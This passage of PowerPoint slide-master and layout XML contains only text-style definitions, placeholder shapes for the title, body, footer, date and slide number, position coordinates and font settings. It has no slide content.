    </p:bodyStyle>
    <p:otherStyle>
      <a:lvl1pPr marL="0">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
      <a:lvl2pPr marL="402724">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr marL="805449">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr marL="1208171">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr marL="1610895">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="2013621">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="2416346">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="2819070">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="3221792">
        <a:defRPr>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Holder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="935182" y="717177"/>
            <a:ext cx="1032163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p>
            <a:pPr lvl="0"/>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1296940" y="2291603"/>
            <a:ext cx="9598121" cy="423193"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2750" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4144818" y="6377549"/>
            <a:ext cx="3902364" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:tint val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="6"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609986" y="6377549"/>
            <a:ext cx="2803621" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="l" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:tint val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{452B207D-E3D1-487A-AC7A-CAD8C9CD18B9}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="7"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8778394" y="6377549"/>
            <a:ext cx="2803622" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" numCol="1" anchor="t" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="r" eaLnBrk="1" hangingPunct="1">
              <a:defRPr>
                <a:solidFill>
                  <a:srgbClr val="898989"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{EEE9C599-11F9-459F-BD2A-01D151B94A8E}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US">
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:pPr fontAlgn="base">
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPct val="0"/>
                </a:spcAft>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1735436669"/>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Lst>
  <p:txStyles>
    <p:titleStyle>
      <a:lvl1pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="+mj-lt"/>
          <a:ea typeface="+mj-ea"/>
          <a:cs typeface="+mj-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
      <a:lvl2pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="402724" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="805449" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="1208171" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="1610895" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl9pPr>
    </p:titleStyle>
    <p:bodyStyle>
      <a:lvl1pPr marL="302575" indent="-302575" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
      <a:lvl2pPr marL="400632" indent="2802" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr marL="804065" indent="2802" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr marL="1207498" indent="2802" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr marL="1608130" indent="5603" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="2013621">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="2416346">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="2819070">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="3221792">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl9pPr>
    </p:bodyStyle>
    <p:otherStyle>
      <a:lvl1pPr marL="0">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
      <a:lvl2pPr marL="402724">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr marL="805449">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr marL="1208171">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr marL="1610895">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="2013621">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="2416346">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="2819070">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="3221792">
        <a:defRPr>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Holder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="940956" y="357188"/>
            <a:ext cx="1031009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p>
            <a:pPr lvl="0"/>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2051" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="902471" y="1193427"/>
            <a:ext cx="1038706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p>
            <a:pPr lvl="0"/>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4144818" y="6377549"/>
            <a:ext cx="3902364" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr" defTabSz="631173" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-GB"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="6"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609986" y="6377549"/>
            <a:ext cx="2803621" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="l" defTabSz="631173" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{F32DFB7B-5707-41A2-8EE5-B76975A331F8}" type="datetimeFigureOut">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="7"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8778394" y="6377549"/>
            <a:ext cx="2803622" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" numCol="1" anchor="t" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="r" defTabSz="630365" eaLnBrk="1" hangingPunct="1">
              <a:defRPr>
                <a:solidFill>
                  <a:srgbClr val="898989"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{CC1D219D-BE94-4979-BD35-EE77F5F5BFDF}" type="slidenum">
              <a:rPr lang="en-GB" altLang="en-US">
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:pPr fontAlgn="base">
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPct val="0"/>
                </a:spcAft>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-GB" altLang="en-US">
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3688551578"/>
      </p:ext>
    </p:extLst>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Lst>
  <p:txStyles>
    <p:titleStyle>
      <a:lvl1pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="+mj-lt"/>
          <a:ea typeface="+mj-ea"/>
          <a:cs typeface="+mj-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
      <a:lvl2pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="403079" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="806157" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="1209236" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="1612314" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl9pPr>
    </p:titleStyle>
    <p:bodyStyle>
      <a:lvl1pPr marL="302575" indent="-302575" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
